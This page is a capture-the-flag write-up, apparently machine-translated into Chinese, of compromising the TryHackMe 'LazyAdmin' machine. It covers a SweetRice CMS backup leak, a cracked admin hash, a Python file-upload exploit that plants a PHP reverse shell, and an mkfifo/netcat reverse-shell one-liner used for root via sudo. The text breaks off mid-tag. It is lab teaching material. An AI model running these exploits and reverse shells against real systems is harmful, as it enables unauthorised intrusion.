<html>
<head>
<title>TryHackMe writeup: LazyAdmin</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMeæŠ¥é“:LazyAdmin</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/lazyadmin-tryhackme-writeup-c5f0d113bec6?source=collection_archive---------1-----------------------#2022-02-09">https://infosecwriteups.com/lazyadmin-tryhackme-writeup-c5f0d113bec6?source=collection_archive---------1-----------------------#2022-02-09</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="6a19" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><a class="ae kp" href="https://www.tryhackme.com/room/lazyadmin" rel="noopener ugc nofollow" target="_blank"> LazyAdmin (2019) </a>æˆ¿é—´ç›¸å½“æœ‰è¶£ã€‚æˆ‘å‡è®¾ç®¡ç†å‘˜å¾ˆâ€œæ‡’â€ï¼Œå› æ­¤è¿™ä¸ªæŒ‘æˆ˜ä¼šå¾ˆå®¹æ˜“ã€‚æˆ‘é”™äº†ï¼Œæˆ‘å‘ç°è‡ªå·±ä¾èµ–äºä¸€ä¸ªä»¥å‰çš„é»‘å®¢å…³äºè¿™ä¸ªæŒ‘æˆ˜çš„æ–‡ç« ã€‚</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj kq"><img src="../Images/10a4d0b143d3b1674672b3f4d605cbf2.png" data-original-src="https://miro.medium.com/v2/resize:fit:774/format:webp/1*PmYen0AKo1QrCtXCtThLpQ.png"/></div><figcaption class="ky kz gk gi gj la lb bd b be z dk translated">åŸºæœ¬å›¾åƒ:â€œæ¥è‡ªåœ°ç‹±çš„æ‚ç§æ“ä½œå‘˜â€å’Œâ€œLil &amp; Putâ€</figcaption></figure><h1 id="83a7" class="lc ld iu bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">ç¨‹åº</h1><h2 id="e3e8" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">ç½‘ç»œæ‰«æ</h2><p id="65f7" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">ä¸è¿™äº›boot2rootæœºå™¨ä¸€æ ·ï¼Œæˆ‘å¯åŠ¨äº†LazyAdminæœºå™¨å¹¶å¼€å§‹æ¢æµ‹æœºå™¨ã€‚æˆ‘ç”¨ä»¥ä¸‹å‚æ•°è¿è¡Œäº†ä¸€æ¬¡<code class="fe mr ms mt mu b">nmap</code>æ‰«æ:</p><p id="53ac" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mr ms mt mu b"><strong class="jt iv">$ nmap -sT -A -v -Pn -O -p- -oX tcp_scan.xml &lt;target ip address&gt;</strong></code></p><p id="08ef" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ‰«ææŠ¥å‘Šåœ¨ç«¯å£22ä¸Šæœ‰ä¸€ä¸ªOpenSSHæœåŠ¡ï¼Œåœ¨ç«¯å£80ä¸Šæœ‰ä¸€ä¸ªApacheæœåŠ¡å™¨ã€‚</p><h2 id="3882" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">æ¢æµ‹webæœåŠ¡å™¨</h2><p id="a933" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">ç„¶åï¼Œæˆ‘è¿è¡Œ<code class="fe mr ms mt mu b">gobuster</code>å·¥å…·å¯¹ç›®å½•è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå‘ç°äº†ä¸€ä¸ªåä¸º<code class="fe mr ms mt mu b">/content</code>çš„å­ç›®å½•ã€‚æµè§ˆåˆ°<code class="fe mr ms mt mu b">/content</code>å­ç›®å½•ï¼Œæˆ‘å‘ç°ç½‘ç»œæœåŠ¡å™¨æ­£åœ¨è¿è¡Œä¸€ä¸ªåä¸ºâ€œSweetRiceâ€çš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå¦‚ä¸‹æ‰€ç¤º:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gi gj mv"><img src="../Images/100acd2e347432e3b2c0227a7095b69c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hs7Le0cYX_C8kV8V30Xtog.png"/></div></div><figcaption class="ky kz gk gi gj la lb bd b be z dk translated">http:// <target ip="" address=""> /contentçš„å†…å®¹</target></figcaption></figure><p id="16d0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">äºæ˜¯æˆ‘ä½¿ç”¨<code class="fe mr ms mt mu b">searchsploit</code>è·å¾—äº†ä¸€ä¸ªä¸SweetRice CMSç›¸å…³çš„æ¼æ´åˆ—è¡¨:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="2747" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">â””â”€$ searchsploit sweetrice</strong> <br/> [...]</span><span id="a19b" class="ma ld iu mu b gz ni nf l ng nh"> Exploit Title | Path<br/> â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” -<br/>SweetRice 0.5.3 â€” Remote File Inclusion | php/webapps/10246.txt<br/>SweetRice 0.6.7 â€” Multiple Vulnerabilities | php/webapps/15413.txt<br/>SweetRice 1.5.1 â€” Arbitrary File Download | php/webapps/40698.py<br/>SweetRice 1.5.1 â€” Arbitrary File Upload | php/webapps/40716.py<br/>SweetRice 1.5.1 â€” Backup Disclosure | php/webapps/40718.txt<br/>SweetRice 1.5.1 â€” Cross-Site Request Forgery | php/webapps/40692.html<br/>SweetRice 1.5.1 â€” Cross-Site Request Forgery / PHP Code Execution | php/webapps/40700.html<br/>SweetRice &lt; 0.6.4 â€” â€˜FCKeditorâ€™ Arbitrary File Upload | php/webapps/14184.txt</span><span id="530b" class="ma ld iu mu b gz ni nf l ng nh">  [...]</span></pre><p id="975a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘å†³å®šå…ˆå°è¯•åˆ©ç”¨<em class="nj"> SweetRice 1.5.1 â€”å¤‡ä»½æŠ«éœ²</em>æ¼æ´ï¼Œå› æ­¤<code class="fe mr ms mt mu b">cat</code>ç»™å‡ºäº†è¿è¡Œæ¼æ´çš„æŒ‡ä»¤:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="b948" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">â””â”€$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt</strong><br/>Title: SweetRice 1.5.1 â€” Backup Disclosure<br/>Application: SweetRice<br/>Versions Affected: 1.5.1<br/>Vendor URL: <a class="ae kp" href="http://www.basic-cms.org/" rel="noopener ugc nofollow" target="_blank">http://www.basic-cms.org/</a><br/>Software URL: <a class="ae kp" href="http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip" rel="noopener ugc nofollow" target="_blank">http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip</a><br/>Discovered by: Ashiyane Digital Security Team<br/>Tested on: Windows 10<br/>Bugs: Backup Disclosure<br/>Date: 16-Sept-2016</span><span id="2518" class="ma ld iu mu b gz ni nf l ng nh">Proof of Concept :</span><span id="72c3" class="ma ld iu mu b gz ni nf l ng nh">You can access to all mysql backup and download them from this directory.<br/>http://localhost/inc/mysql_backup</span><span id="2b67" class="ma ld iu mu b gz ni nf l ng nh">and can access to website files backup from:<br/>http://localhost/SweetRice-transfer.zip</span></pre><p id="aec9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æœ‰æ„æ€ã€‚æ‰€ä»¥æˆ‘å†³å®šåœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä»¥ä¸‹å†…å®¹:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="5e00" class="ma ld iu mu b gz ne nf l ng nh">(#1) http://&lt;target ip address&gt;/content/inc/mysql_backup<br/>(#2) http://&lt;target ip address&gt;/content/SweetRice-transfer.zip</span></pre><p id="3f34" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">é“¾æ¥#2è¿”å›äº†ä¸€ä¸ªâ€œæ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶â€404é”™è¯¯ï¼Œä½†æ˜¯é“¾æ¥#1ç»™äº†æˆ‘ä¸€ä¸ªçœ‹èµ·æ¥åƒSQLè½¬å‚¨çš„ä¸œè¥¿ã€‚å› æ­¤ï¼Œå¾ˆè‡ªç„¶åœ°ï¼Œæˆ‘ä¸‹è½½äº†å®ƒï¼Œå¹¶ç”¨æ–‡æœ¬ç¼–è¾‘ç¨‹åºæ£€æŸ¥äº†å®ƒã€‚æˆ‘åœ¨ç¬¬79è¡Œå‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„æ¡ç›®:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="704b" class="ma ld iu mu b gz ne nf l ng nh">[ ... snip ... ]</span><span id="9cf3" class="ma ld iu mu b gz ni nf l ng nh">14 =&gt; â€˜INSERT INTO `% â€” %_options` VALUES(\â€™1\â€™,\â€™global_setting\â€™,\â€™a:17:{s:4:\\â€name\\â€;s:25:\\â€Lazy Admin&amp;#039;s Website\\â€;s:6:\\â€author\\â€;s:10:\\â€Lazy Admin\\â€;s:5:\\â€title\\â€;s:0:\\â€\\â€;s:8:\\â€keywords\\â€;s:8:\\â€Keywords\\â€;s:11:\\â€description\\â€;s:11:\\â€Description\\â€;s:5:<strong class="mu iv">\\â€admin\\â€;s:7:\\â€manager\\â€;s:6:\\â€passwd\\â€;s:32:\\â€42f749ade7f9e195bf475f37a44cafcb\\â€</strong>;s:5:\\â€close\\â€;i:1;s:9:\\â€close_tip\\â€;s:454:\\â€&lt;p&gt;Welcome to SweetRice â€” Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\â€Site close\\â€ to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\"<a class="ae kp" href="http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\" rel="noopener ugc nofollow" target="_blank">http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\</a>"&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\â€;s:5:\\â€cache\\â€;i:0;s:13:\\â€cache_expired\\â€;i:0;s:10:\\â€user_track\\â€;i:0;s:11:\\â€url_rewrite\\â€;i:0;s:4:\\â€logo\\â€;s:0:\\â€\\â€;s:5:\\â€theme\\â€;s:0:\\â€\\â€;s:4:\\â€lang\\â€;s:9:\\â€en-us.php\\â€;s:11:\\â€admin_email\\â€;N;}\â€™,\â€™1575023409\â€™);â€™,</span><span id="0e84" class="ma ld iu mu b gz ni nf l ng nh">[ ... snip ... ]</span></pre><p id="c735" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">è¿™çœ‹èµ·æ¥åƒæ˜¯åŒ…å«äº†ç®¡ç†å‘˜é¢æ¿çš„é…ç½®ä¿¡æ¯ã€‚ç›®æµ‹SQLæ¡ç›®ï¼Œæˆ‘çœ‹åˆ°:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="8882" class="ma ld iu mu b gz ne nf l ng nh">â€admin\\â€;s:7:\\â€manager\\â€;s:6:\\â€passwd\\â€;s:32:\\â€42f749ade7f9e195bf475f37a44cafcb\\â€</span></pre><p id="ce29" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¥½åƒç”¨æˆ·åæ˜¯<code class="fe mr ms mt mu b">manager</code>ï¼Œå¯†ç æ˜¯hash <code class="fe mr ms mt mu b">42f749ade7f9e195bf475f37a44cafcb</code>ã€‚æˆ‘ç”¨<a class="ae kp" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank"> CrackStation (n.d.) </a>ç ´è§£hashï¼Œå¾—åˆ°äº†<code class="fe mr ms mt mu b">Password123</code>çš„ç»“æœã€‚</p><p id="69e0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">é‰´äºè¿™ä¸ªæˆ¿é—´åä¸ºâ€œLazyAdminâ€ï¼Œæˆ‘å°è¯•ä½¿ç”¨ç®¡ç†å™¨å’Œå¯†ç 123ç”¨æˆ·åå’Œå¯†ç ç»„åˆç™»å½•SSHæœåŠ¡:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="a38a" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">â””â”€$ ssh manager@&lt;target ip address&gt; </strong><br/>The authenticity of host â€˜&lt;target ip address&gt; (&lt;target ip address&gt;)â€™ canâ€™t be established.<br/>ED25519 key fingerprint is SHA256:gIHwIzi5a1G1WvkLMxJuFhSXiUnHy58kdQUcxmC6rIQ.<br/>This host key is known by the following other names/addresses:<br/> ~/.ssh/known_hosts:80: [hashed name]<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added â€˜&lt;target ip address&gt;â€™ (ED25519) to the list of known hosts.<br/>manager@&lt;target ip address&gt;â€™s password: <strong class="mu iv">[Password123]</strong><br/>Permission denied, please try again.<br/>manager@&lt;target ip address&gt;â€™s password: <strong class="mu iv">[Password123]</strong><br/>Permission denied, please try again.<br/>manager@&lt;target ip address&gt;â€™s password: <strong class="mu iv">[Password123]</strong><br/>manager@&lt;target ip address&gt;: Permission denied (publickey,password).</span></pre><p id="0742" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å—¯ï¼Œæˆ‘çš„ç›´è§‰åˆ°æ­¤ä¸ºæ­¢ğŸ˜‹</p><h2 id="5b13" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><p id="1c4a" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">æ‰€ä»¥æˆ‘æƒ³æˆ‘åº”è¯¥ä¸“æ³¨äºå¼€å‘sweet rice webåº”ç”¨ç¨‹åºã€‚æˆ‘è¯•ç€æ‘†å¼„ç®¡ç†é¢æ¿ï¼Œä½†æ²¡æœ‰ä»»ä½•è¿›å±•ã€‚å› æ­¤ï¼Œå›å¤´çœ‹ä¸€ä¸‹SearchSploitçš„ç»“æœï¼Œæˆ‘æ³¨æ„åˆ°äº†å¦ä¸€ä¸ªåä¸ºâ€œsweet rice 1 . 5 . 1â€”â€”ä»»æ„æ–‡ä»¶ä¸Šä¼ â€çš„æ¼æ´ï¼Œæˆ‘æ„è¯†åˆ°æˆ‘å¯ä»¥ç”¨å®ƒå°†web shellä¸Šä¼ åˆ°webæœåŠ¡å™¨ä¸Šã€‚</p><p id="12ff" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ‰€ä»¥æˆ‘å†³å®šè¿è¡Œè„šæœ¬ï¼Œå¹¶å¾—åˆ°ä»¥ä¸‹é”™è¯¯:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="b776" class="ma ld iu mu b gz ne nf l ng nh">[ â€¦ snip â€¦ ]</span><span id="5629" class="ma ld iu mu b gz ni nf l ng nh">Enter The Target URL(Example : localhost.com) : http://&lt;target ip address&gt;/content/<br/>Traceback (most recent call last):<br/> File â€œexploit.pyâ€, line 37, in &lt;module&gt;<br/> host = input(â€œEnter The Target URL(Example : localhost.com) : â€œ)<br/> File â€œ&lt;string&gt;â€, line 1<br/> http://&lt;target ip address&gt;/content/<br/> ^<br/>SyntaxError: invalid syntax</span></pre><p id="50dc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¥½å§ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹æºä»£ç :</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="70ee" class="ma ld iu mu b gz ne nf l ng nh">[ ... snip ... ]</span><span id="8046" class="ma ld iu mu b gz ni nf l ng nh"># Get Host &amp; User &amp; Pass &amp; filename<br/>host = input(â€œEnter The Target URL(Example : localhost.com) : â€œ)<br/>username = input(â€œEnter Username : â€œ)<br/>password = input(â€œEnter Password : â€œ)<br/>filename = input(â€œEnter FileName (Example:.htaccess,shell.php5,index.html) : â€œ)<br/>file = {â€˜upload[]â€™: open(filename, â€˜rbâ€™)}</span><span id="68d2" class="ma ld iu mu b gz ni nf l ng nh">payload = {<br/>    â€˜userâ€™:username,<br/>    â€˜passwdâ€™:password,<br/>    â€˜rememberMeâ€™:â€™â€™<br/>}</span><span id="c7a1" class="ma ld iu mu b gz ni nf l ng nh">with session() as r:<br/>    login = r.post(â€˜http://' + host + â€˜/as/?type=signinâ€™, data=payload)<br/>    success = â€˜Login successâ€™<br/>    if login.status_code == 200:<br/>        print(â€œ[+] Sending User&amp;Passâ€¦â€)<br/>            if login.text.find(success) &gt; 1:<br/>                print(â€œ[+] Login Succssfullyâ€¦â€)<br/>            else:<br/>               print(â€œ[-] User or Pass is incorrentâ€¦â€)<br/>               print(â€œGood Byeâ€¦â€)<br/>               exit()<br/>               pass<br/>            pass<br/>    uploadfile = r.post(â€˜<a class="ae kp" rel="noopener ugc nofollow" target="_blank" href="/'">http://â€™</a> + host + â€˜/as/?type=media_center&amp;mode=uploadâ€™, files=file)<br/>    if uploadfile.status_code == 200:<br/>        print(â€œ[+] File Uploadedâ€¦â€)<br/>        print(â€œ[+] URL : http://â€ + host + â€œ/attachment/â€ + filename)<br/>        pass</span></pre><p id="a46d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">éœ€è¦åšå‡ºä¸¤ä¸ªé‡è¦çš„æ”¹å˜:</p><ul class=""><li id="c96b" class="nk nl iu jt b ju jv jy jz kc nm kg nn kk no ko np nq nr ns bi translated">é¦–å…ˆï¼Œå½“è„šæœ¬è¦æ±‚<code class="fe mr ms mt mu b">host</code>ã€<code class="fe mr ms mt mu b">username</code>ã€<code class="fe mr ms mt mu b">password</code>å’Œ<code class="fe mr ms mt mu b">filename</code>æ—¶ï¼Œéœ€è¦å°†<code class="fe mr ms mt mu b">input()</code>å‡½æ•°æ”¹ä¸º<code class="fe mr ms mt mu b">raw_input()</code></li><li id="a0ea" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">ç¬¬äºŒï¼Œè¾“å…¥<code class="fe mr ms mt mu b">host</code>æ—¶ï¼Œåªæ”¾å…¥<code class="fe mr ms mt mu b">&lt;target ip address&gt;/&lt;sweetrice directory&gt;</code>å‡å»<code class="fe mr ms mt mu b">http://</code>ä½ã€‚è¯¥è„šæœ¬çš„ä½œè€…å·²ç»è®¾ç½®å‘é€å¸¦æœ‰<code class="fe mr ms mt mu b">http://</code>å‰ç¼€çš„webè¯·æ±‚ï¼Œæ·»åŠ å¦ä¸€ä¸ªâ€œhttp://â€å°†ä¼šæ··æ·†æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚</li></ul><p id="909a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç°åœ¨æˆ‘åªéœ€è¦é€‰æ‹©å’Œé…ç½®ä¸€ä¸ªweb shellã€‚æˆ‘ä¼šé€‰<em class="nj"> Pentest Monkeyçš„åå£³</em>ï¼Œå®ƒä½äº:</p><p id="8e38" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mr ms mt mu b">/usr/share/webshells/php/php-reverse-shell.php</code></p><p id="b371" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">åœ¨Kali Linuxä¸Šã€‚æˆ‘è®¾ç½®äº†ä»¥ä¸‹é…ç½®:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="7159" class="ma ld iu mu b gz ne nf l ng nh">[ ... snip ... ]</span><span id="3cca" class="ma ld iu mu b gz ni nf l ng nh">set_time_limit (0);<br/>$VERSION = â€œ1.0â€;<br/>$ip = â€˜&lt;my attackbox ip address&gt;â€™; // CHANGE THIS<br/>$port = 4444; // CHANGE THIS<br/>$chunk_size = 1400;<br/>$write_a = null;</span><span id="e786" class="ma ld iu mu b gz ni nf l ng nh">[ ... snip ... ]</span></pre><p id="d287" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">è¿è¡Œæ¼æ´ï¼Œç„¶åâ€¦</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="2c32" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">â””â”€$ python exploit.py</strong></span><span id="a24a" class="ma ld iu mu b gz ni nf l ng nh">Enter The Target URL(Example : localhost.com) : &lt;target ip address&gt;/content<br/>Enter Username : manager<br/>Enter Password : Password123 <br/>Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5<br/>[+] Sending User&amp;Passâ€¦<br/>[+] Login Succssfullyâ€¦<br/>[+] File Uploadedâ€¦<br/>[+] URL : http://&lt;target ip address&gt;/content/attachment/shell.php5</span></pre><p id="40fc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘åªéœ€è¦è®¾ç½®ä¸€ä¸ªnetcatç›‘å¬å™¨ï¼Œå¹¶é€šè¿‡æˆ‘çš„webæµè§ˆå™¨è¯·æ±‚phpè„šæœ¬:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="35c5" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">â””â”€$ nc -l -n -v -p 4444</strong><br/>listening on [any] 4444 â€¦</span><span id="9110" class="ma ld iu mu b gz ni nf l ng nh">[ â€¦ requests the php shell â€¦]</span><span id="7807" class="ma ld iu mu b gz ni nf l ng nh">connect to [&lt;attackbox ip address&gt;] from (UNKNOWN) [&lt;target ip address&gt;] 57614<br/>Linux THM-Chal 4.15.0â€“70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux<br/> 00:17:45 up 1:32, 0 users, load average: 0.00, 0.00, 0.00<br/>USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>/bin/sh: 0: canâ€™t access tty; job control turned off<br/><strong class="mu iv">$ whoami</strong><br/>www-data</span></pre><p id="b2fe" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘åŠ å…¥äº†ã€‚</p><h2 id="78cd" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">æ ‡å¿—å’Œåˆå§‹è®¿é—®å</h2><p id="e661" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">æˆ‘å°†ç»§ç»­è·å–ç”¨æˆ·æ ‡å¿—ï¼Œå¹¶æƒ³å‡ºä¸€ç§è·å–rootæƒé™çš„æ–¹æ³•:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="9a95" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">$ cd /home</strong><br/><strong class="mu iv">$ ls</strong><br/>itguy<br/><strong class="mu iv">$ cd itguy</strong><br/><strong class="mu iv">$ ls</strong><br/>Desktop<br/>Documents<br/>Downloads<br/>Music<br/>Pictures<br/>Public<br/>Templates<br/>Videos<br/>backup.pl<br/>examples.desktop<br/>mysql_login.txt<br/>user.txt<br/><strong class="mu iv">$ cat user.txt # &lt;- the user flag<br/></strong><em class="nj">[redacted]</em></span></pre><p id="aa4d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¥½å§ï¼Œè¿™å¾ˆå¥½ã€‚ä½†ç°åœ¨æˆ‘éœ€è¦æƒ³åŠæ³•æ‰¾åˆ°æ ¹ã€‚åœ¨å°è¯•ä½¿ç”¨<code class="fe mr ms mt mu b">mysql_login.txt</code>ç»™å‡ºçš„å‡­è¯ç™»å½•MySQLæ•°æ®åº“ä¹‹åï¼Œå¹¶ä¸”åœ¨ç”±äºä¸¥æ ¼çš„ç›®å½•è®¸å¯è€Œæ— æ³•å°†Linuxæ™ºèƒ½æšä¸¾(<a class="ae kp" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank"> Blancoï¼Œn.d. </a>)åŠ è½½åˆ°ç³»ç»Ÿä¸Šä¹‹åï¼Œæˆ‘å†³å®šè½¬è€Œä¸“æ³¨äºé€šè¿‡<code class="fe mr ms mt mu b">backup.pl</code>è„šæœ¬è·å¾—rootè®¿é—®æƒé™ã€‚è„šæœ¬çš„å†…å®¹æ˜¯:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="e58d" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">$ cat backup.pl</strong><br/>#!/usr/bin/perl</span><span id="69e4" class="ma ld iu mu b gz ni nf l ng nh">system(â€œshâ€, â€œ/etc/copy.shâ€);</span></pre><p id="3263" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mr ms mt mu b">/etc/copy.sh</code>å‰§æœ¬çœ‹èµ·æ¥å¾ˆæœ‰è¶£ã€‚å…¶å†…å®¹æ˜¯:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="570b" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">$ cat /etc/copy.sh</strong><br/>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f</span></pre><p id="9bf6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘çŸ¥é“æˆ‘å¿…é¡»å¯¹è¿™ä¸ªè„šæœ¬åšäº›ä»€ä¹ˆæ¥è·å¾—rootè®¿é—®æƒé™ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯ä¸èƒ½æŠŠæˆ‘çš„æ‰‹æŒ‡æ”¾åœ¨å®ƒä¸Šé¢ã€‚å› æ­¤ï¼Œæˆ‘å°è¯•ç ”ç©¶è¿™äº›å‘½ä»¤ï¼Œå¹¶æœ€ç»ˆåœ¨å…¶ä»–æ–‡ç« ä¸­å¯»æ‰¾â€œæç¤ºâ€æˆ‘çœ‹åˆ°äº†<a class="ae kp" href="https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/" rel="noopener ugc nofollow" target="_blank">ã€Šç©†å…°å¤šå°”ã€‹(2020) </a>å†™çš„ä¸€ç¯‡å…³äºè¿™ä¸ªæˆ¿é—´çš„æ–‡ç« ï¼Œå¹¶å†³å®šå¤åˆ¶ä»–ä»¬çš„æŠ€å·§:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="1407" class="ma ld iu mu b gz ne nf l ng nh">[ ... target machine ... ]</span><span id="d8d2" class="ma ld iu mu b gz ni nf l ng nh"><strong class="mu iv">$ echo â€œrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;target ip address&gt; 5554 &gt;/tmp/fâ€ &gt; /etc/copy.sh</strong><br/><strong class="mu iv">$ sudo /usr/bin/perl /home/itguy/backup.pl</strong></span><span id="2201" class="ma ld iu mu b gz ni nf l ng nh">[ ... attackbox ... ]</span><span id="f110" class="ma ld iu mu b gz ni nf l ng nh"><strong class="mu iv">â””â”€$ nc -l -v -n -p 5554</strong><br/>listening on [any] 5554 ...<br/>connect to [&lt;attackbox ip address&gt;] from (UNKNOWN) [&lt;target ip address&gt;] 36926<br/>/bin/sh: 0: can't access tty; job control turned off<br/><strong class="mu 